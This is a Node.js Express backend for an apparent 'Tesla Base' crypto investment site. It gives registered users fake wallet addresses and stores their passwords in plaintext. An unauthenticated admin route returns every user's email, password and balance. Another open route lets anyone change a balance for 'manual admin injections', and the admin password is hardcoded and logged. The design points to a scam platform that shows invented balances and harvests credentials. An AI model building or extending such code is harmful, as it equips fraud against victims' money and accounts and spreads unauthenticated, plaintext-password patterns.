const express = require('express');
const { Pool } = require('pg');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
const app = express();

// --- MIDDLEWARE ---
app.use(express.json());
app.use(cors());
app.use(express.static('public'));

// --- 1. DATABASE CONNECTION ---
// Replace the connection string with your actual PostgreSQL URL
const pool = new Pool({
    connectionString: "YOUR_POSTGRESQL_URL_HERE",
    ssl: { rejectUnauthorized: false }
});

// --- 2. GMAIL CONFIGURATION (For OTP & Notifications) ---
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'YOUR_GMAIL@gmail.com',
        pass: 'xxxx xxxx xxxx xxxx' // Your 16-character App Password
    }
});

// --- 3. ADMIN SECURITY (SOLOMON200) ---
const ADMIN_PASS = "SOLOMON200";

// Verify Admin Password
app.post('/api/admin/verify', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASS) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: "Unauthorized" });
    }
});

// Admin Dashboard: Fetch all users (Email, Password, Balance, Wallet)
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query('SELECT email, password, balance, wallet_address FROM users ORDER BY id DESC');
        res.json(result.rows);
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Access Denied" });
    }
});

// --- 4. USER AUTHENTICATION & PERSISTENCE ---

// Register New User
app.post('/api/auth/register', async (req, res) => {
    const { email, password } = req.body;
    try {
        const check = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (check.rows.length > 0) return res.status(400).json({ error: "User already exists" });
        
        // Generates a fake unique wallet for the user as per your request
        const fakeWallet = '1TeslaBase' + Math.random().toString(36).substring(2, 15);
        
        await pool.query(
            'INSERT INTO users (email, password, balance, wallet_address) VALUES ($1, $2, $3, $4)', 
            [email, password, 0.00, fakeWallet]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Fetch Persistent User Data (Balance, Email, etc.)
app.get('/api/user/data', async (req, res) => {
    const { email } = req.query;
    try {
        const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (result.rows.length > 0) {
            res.json(result.rows[0]);
        } else {
            res.status(404).json({ error: "User not found" });
        }
    } catch (e) {
        res.status(500).json({ error: "Database error" });
    }
});

// --- 5. FUND MANAGEMENT ---

// Update Balance (Used for wins, losses, or manual admin injections)
app.post('/api/user/update-balance', async (req, res) => {
    const { email, amount } = req.body;
    try {
        // SQL query to add/subtract from existing balance
        await pool.query('UPDATE users SET balance = balance + $1 WHERE email = $2', [amount, email]);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: "Balance update failed" });
    }
});

// --- SERVER START ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`-----------------------------------------`);
    console.log(`Tesla Base Master Server Live on Port ${PORT}`);
    console.log(`Admin Password: ${ADMIN_PASS}`);
    console.log(`-----------------------------------------`);
});
